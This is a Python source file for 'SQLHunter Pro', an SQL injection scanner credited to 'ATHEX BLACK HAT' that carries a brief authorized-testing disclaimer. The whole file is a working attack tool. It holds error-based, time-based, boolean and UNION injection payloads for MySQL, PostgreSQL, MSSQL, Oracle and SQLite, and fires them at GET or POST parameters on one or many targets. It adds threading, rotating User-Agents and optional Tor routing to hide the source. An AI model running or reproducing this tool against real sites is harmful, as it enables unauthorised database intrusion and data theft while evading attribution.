#!/usr/bin/env python3
# SQLHunter Pro - Advanced SQL Injection Scanner
# Author: ATHEX BLACK HAT
# Version: 2.1 (bugfix + POST support)
# For authorized penetration testing only

import requests
import time
import argparse
import sys
import random
import threading
import json
import os
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter

# ============ COLORS ============
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
C = '\033[96m'
M = '\033[95m'
B = '\033[94m'
W = '\033[0m'
BOLD = '\033[1m'

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]

VERSION = "2.1"
REPORT_DIR = "reports"

# ============ GLOBAL REQUEST COUNTER ============
_req_lock = threading.Lock()
REQ_COUNT = 0

def _inc_req():
    global REQ_COUNT
    with _req_lock:
        REQ_COUNT += 1

# ============ BANNER ============
def type_print(text, delay=0.001, color=W):
    for ch in text:
        sys.stdout.write(color + ch + W)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    art = rf"""{C}
   ███████╗ ██████╗ ██╗           ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
   ██╔════╝██╔═══██╗██║           ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████╗██║   ██║██║           ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ╚════██║██║▄▄ ██║██║           ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ███████║╚██████╔╝██║           ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚══════╝ ╚═════╝ ███████║      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                             DEVELOPER - ATHEX BLACK HAT
{W}"""
    print(art)
    print(f"{M}{'═'*75}{W}")
    type_print(f"  {BOLD}SQLHunter Pro v{VERSION}{W}  |  {Y}Advanced SQL Injection Scanner{W}", 0.002, C)
    type_print(f"  {G}[✓]{W} Error-Based  {G}[✓]{W} Boolean-Based  {G}[✓]{W} Time-Based  {G}[✓]{W} Union-Based  {G}[✓]{W} POST", 0.001)
    print(f"{M}{'═'*75}{W}\n")

def loading_animation(msg="Initializing", duration=1.5):
    chars = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        sys.stdout.write(f"\r{C}[{chars[i % len(chars)]}]{W} {msg}...")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write(f"\r{G}[✓]{W} {msg}... Done!   \n")

# ============ ARGS ============
def get_args():
    parser = argparse.ArgumentParser(
        usage="python3 %(prog)s [options]",
        description="SQLHunter Pro - Advanced SQL Injection Scanner",
        epilog=(
            "GET  : python3 sqlhunter.py -u 'http://target.com/page.php?id=1'\n"
            "POST : python3 sqlhunter.py -u 'http://target.com/login' "
            "--method POST --data 'user=admin&pass=1'"
        )
    )
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-l", "--list", help="File with multiple targets")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Threads (default: 5)")
    parser.add_argument("-o", "--output", choices=["json", "txt"], help="Save report")
    parser.add_argument("--tor", action="store_true", help="Route via Tor (socks5://127.0.0.1:9050)")
    parser.add_argument("--proxy", help="Custom proxy (http://127.0.0.1:8080)")
    parser.add_argument("--cookie", help="Cookie header")
    parser.add_argument("--delay", type=float, default=0, help="Delay between payload requests (sec)")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method (default GET)")
    parser.add_argument("--data", help="POST data (example: 'user=admin&pass=1')")
    parser.add_argument("-v", "--version", action="store_true", help="Show version")
    args = parser.parse_args()

    if args.version:
        print(f"{G}SQLHunter Pro v{VERSION}{W}")
        sys.exit(0)
    if not args.url and not args.list:
        parser.print_help()
        sys.exit(1)
    if args.url and args.list:
        sys.exit(f"{R}[ERROR]{W} Use -u OR -l, not both")
    if args.method == "POST" and not args.data:
        sys.exit(f"{R}[ERROR]{W} --method POST requires --data 'k=v&k2=v2'")

    # Validate POST data format
    if args.data and "=" not in args.data:
        sys.exit(f"{R}[ERROR]{W} --data must be in 'key=value&key2=value2' format")

    return args

# ============ SESSION ============
def build_session(args):
    s = requests.Session()
    # Thread-safe pool
    adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20)
    s.mount("http://", adapter)
    s.mount("https://", adapter)

    if args.tor:
        s.proxies = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
    elif args.proxy:
        s.proxies = {"http": args.proxy, "https": args.proxy}
    return s

def build_headers(args):
    h = {"User-Agent": random.choice(USER_AGENTS)}
    if args.cookie:
        h["Cookie"] = args.cookie
    if args.method == "POST":
        h["Content-Type"] = "application/x-www-form-urlencoded"
    return h

# ============ PAYLOADS ============
DB_PAYLOADS = {
    "MySQL": {
        "error": "' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)-- -",
        "time":  "' AND (SELECT 1 FROM (SELECT(SLEEP({sec})))a)-- -",
        "union": "' UNION SELECT ",
        "keywords": ["xpath", "mariadb", "sql syntax", "kex_xpath", "updatexml"]
    },
    "PostgreSQL": {
        "error": "' AND 1=CAST((SELECT version()) AS int)-- -",
        "time":  "' AND (SELECT 5 FROM pg_sleep({sec}))-- -",
        "union": "' UNION SELECT ",
        "keywords": ["invalid input syntax", "postgre", "pg_sleep", "cast"]
    },
    "MSSQL": {
        "error": "' AND 1=CONVERT(int,@@version)-- -",
        "time":  "'; WAITFOR DELAY '0:0:{sec}'-- -",
        "union": "' UNION SELECT ",
        "keywords": ["unclosed quotation mark", "microsoft ole db", "sql server", "convert"]
    },
    "Oracle": {
        "error": "' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))-- -",
        "time":  "' AND 1=(SELECT 1 FROM dual WHERE 1=dbms_pipe.receive_message(('a'),{sec}))-- -",
        "union": "' UNION SELECT ",
        "keywords": ["ora-", "oracle", "utl_inaddr"]
    },
    "SQLite": {
        "error": "' AND 1=randomblob(-1)-- -",
        "time":  "' AND 1=randomblob(1000000000)-- -",
        "union": "' UNION SELECT ",
        "keywords": ["sqlite", "malformed"]
    }
}

# ============ CORE SEND (GET/POST unified) ============
def send(session, url, params, headers, timeout, delay=0, method="GET", post_data_template=None):
    """
    Unified sender.
    - GET  : params go into query string
    - POST : params go into body (as urlencoded)
    """
    if delay:
        time.sleep(delay)
    _inc_req()

    if method == "GET":
        return session.get(url, params=params, headers=headers,
                           timeout=timeout, allow_redirects=False)
    else:
        return session.post(url, data=params, headers=headers,
                            timeout=timeout, allow_redirects=False)


def parse_post_data(data_str):
    """Convert 'k=v&k2=v2' to dict."""
    out = {}
    for pair in data_str.split("&"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            out[k.strip()] = v.strip()
    return out


# ============ CORE CHECKS ============
def check_error_based(session, url, params, p, headers, delay, method):
    found = []
    for db, pl in DB_PAYLOADS.items():
        tp = params.copy()
        tp[p] = f"{params[p]}{pl['error']}"
        try:
            r = send(session, url, tp, headers, 10, delay, method)
            body = r.text.lower()
            if any(k in body for k in pl["keywords"]):
                # Confidence: 500 status = higher
                confidence = "HIGH" if r.status_code == 500 else "MED"
                found.append(db)
                print(f"  {R}[VULN]{W} {BOLD}{db}{W} → Error-Based SQLi ✓ ({confidence})")
        except Exception:
            pass
    return found

def check_boolean_based(session, url, params, p, headers, delay, method):
    try:
        tp_t = params.copy(); tp_f = params.copy()
        tp_t[p] = f"{params[p]}' OR 1=1-- -"
        tp_f[p] = f"{params[p]}' OR 1=2-- -"
        r_t = send(session, url, tp_t, headers, 10, delay, method)
        r_f = send(session, url, tp_f, headers, 10, delay, method)
        diff = abs(len(r_t.text) - len(r_f.text))
        if diff > 50 and r_t.status_code == r_f.status_code:
            print(f"  {Y}[INFO]{W} Boolean-Based indication (diff: {diff} bytes)")
            return True
    except Exception:
        pass
    return False

def check_time_based(session, url, params, p, headers, delay, method):
    found = []

    # ---- Baseline: normal request latency ----
    try:
        base_start = time.time()
        send(session, url, params, headers, 10, 0, method)
        baseline = time.time() - base_start
    except Exception:
        baseline = 0.5  # fallback

    threshold = max(4.5, baseline + 4.0)

    for db, pl in DB_PAYLOADS.items():
        tp = params.copy()
        tp[p] = f"{params[p]}{pl['time'].format(sec=5)}"
        start = time.time()
        try:
            send(session, url, tp, headers, 15, delay, method)
            elapsed = time.time() - start
            if elapsed >= threshold:
                # Double confirm with 8s
                tp2 = params.copy()
                tp2[p] = f"{params[p]}{pl['time'].format(sec=8)}"
                s2 = time.time()
                send(session, url, tp2, headers, 18, delay, method)
                if time.time() - s2 >= (threshold + 2.5):
                    found.append(db)
                    print(f"  {R}[VULN]{W} {BOLD}{db}{W} → Time-Based SQLi CONFIRMED ✓")
        except requests.exceptions.ReadTimeout:
            found.append(db)
            print(f"  {R}[VULN]{W} {BOLD}{db}{W} → Time-Based SQLi (timeout) ✓")
        except Exception:
            pass
    return found

def check_union_based(session, url, params, p, headers, delay, method):
    """
    UNION detection using a visible marker.
    Agar response mein marker nazar aaye -> confirmed.
    """
    MARKER = "SQLHX" + str(random.randint(1000, 9999))
    for i in range(1, 8):
        for quote in ["'", "\"", ""]:
            # Try MySQL-style
            cols = ",".join(["NULL"] * i)
            # Put marker in first position
            union_payload = (
                f"{params[p]}{quote} UNION SELECT "
                f"'{MARKER}',{','.join(['NULL'] * (i - 1))}-- -"
            )
            tp = params.copy()
            tp[p] = union_payload
            try:
                r = send(session, url, tp, headers, 10, delay, method)
                if MARKER in r.text:
                    print(f"  {R}[VULN]{W} {BOLD}UNION-Based{W} → {i} columns (marker visible) ✓")
                    return i
            except Exception:
                pass
    return None

# ============ TARGET SCAN ============
def scan_target(target_url, session, headers, delay, args):
    """
    Works for both GET and POST.
    - GET : parse query string from URL
    - POST: parse --data
    """
    method = args.method

    if method == "GET":
        parsed = urlparse(target_url)
        if not parsed.query:
            print(f"{R}[SKIP]{W} No parameters: {target_url}")
            return []
        base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
        query_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
    else:
        base_url = target_url
        query_params = parse_post_data(args.data)
        if not query_params:
            print(f"{R}[SKIP]{W} No POST data for {target_url}")
            return []

    print(f"\n{C}{'═'*70}{W}")
    print(f"{G}[TARGET]{W} {base_url}  {C}[{method}]{W}")
    print(f"{G}[PARAMS]{W} {', '.join(query_params.keys())}")
    print(f"{C}{'═'*70}{W}")

    findings = []

    for p in query_params:
        print(f"\n{Y}[TEST]{W} Parameter: {C}{p}{W}")
        loading_animation(f"Fuzzing {p}", 0.8)

        result = {"param": p, "url": target_url, "method": method,
                  "types": [], "dbs": []}

        err = check_error_based(session, base_url, query_params, p, headers, delay, method)
        if err:
            result["types"].append("error")
            result["dbs"].extend(err)

        if check_boolean_based(session, base_url, query_params, p, headers, delay, method):
            result["types"].append("boolean")
            # Heuristic: most boolean-based on real sites = MySQL
            if not result["dbs"]:
                result["dbs"].append("unknown(boolean)")

        t = check_time_based(session, base_url, query_params, p, headers, delay, method)
        if t:
            result["types"].append("time")
            result["dbs"].extend(t)

        u = check_union_based(session, base_url, query_params, p, headers, delay, method)
        if u:
            result["types"].append(f"union({u} cols)")

        if result["types"]:
            result["dbs"] = list(set(result["dbs"]))
            findings.append(result)

    return findings

# ============ REPORT ============
def save_report(all_findings, fmt, meta=None):
    os.makedirs(REPORT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(REPORT_DIR, f"sqlhunter_{ts}.{fmt}")

    meta = meta or {}

    if fmt == "json":
        with open(path, "w") as f:
            json.dump({
                "scan_time": ts,
                "version": VERSION,
                "total_vulns": len(all_findings),
                "total_requests": REQ_COUNT,
                "meta": meta,
                "findings": all_findings
            }, f, indent=2)
    else:
        with open(path, "w") as f:
            f.write(f"SQLHunter Pro v{VERSION} Report - {ts}\n{'='*60}\n")
            f.write(f"Total Requests: {REQ_COUNT}\n")
            f.write(f"Total Vulns   : {len(all_findings)}\n\n")
            for v in all_findings:
                f.write(f"URL     : {v['url']}\n")
                f.write(f"Method  : {v.get('method','GET')}\n")
                f.write(f"Param   : {v['param']}\n")
                f.write(f"Types   : {', '.join(v['types'])}\n")
                f.write(f"DBs     : {', '.join(v['dbs'])}\n")
                f.write(f"{'-'*60}\n")

    print(f"\n{G}[SAVED]{W} Report: {path}")

# ============ MAIN ============
def main():
    banner()
    args = get_args()
    loading_animation("Building session", 1.0)

    session = build_session(args)
    headers = build_headers(args)

    targets = []
    if args.url:
        targets.append(args.url)
    else:
        try:
            with open(args.list, "r") as f:
                targets = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            sys.exit(f"{R}[ERROR]{W} File not found: {args.list}")

    loading_animation(f"Loaded {len(targets)} target(s)", 1.0)
    print(f"{G}[START]{W} Method: {C}{args.method}{W}  |  Scan started at {datetime.now().strftime('%H:%M:%S')}\n")

    all_findings = []
    start = time.time()

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(scan_target, t, session, headers, args.delay, args): t for t in targets}
        for fut in as_completed(futures):
            try:
                all_findings.extend(fut.result())
            except Exception as e:
                print(f"{R}[ERROR]{W} {e}")

    elapsed = time.time() - start

    print(f"\n{M}{'═'*70}{W}")
    print(f"{BOLD}{G}[SCAN COMPLETE]{W}  Time: {elapsed:.2f}s  |  Vulns: {R}{len(all_findings)}{W}  |  Requests: {C}{REQ_COUNT}{W}")
    print(f"{M}{'═'*70}{W}")

    if all_findings:
        print(f"\n{R}{BOLD}[!] VULNERABILITIES FOUND:{W}")
        for v in all_findings:
            print(f"  {R}▸{W} {v['url']}  [{C}{v['param']}{W}]  {M}({v.get('method','GET')}){W}")
            print(f"     Types: {Y}{', '.join(v['types'])}{W}")
            print(f"     DBs:   {R}{', '.join(v['dbs']) if v['dbs'] else 'unknown'}{W}")
    else:
        print(f"\n{Y}[i]{W} No vulnerabilities detected")

    if args.output:
        save_report(all_findings, args.output, meta={
            "method": args.method,
            "targets": targets
        })

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!]{W} Interrupted by user")
        sys.exit(0)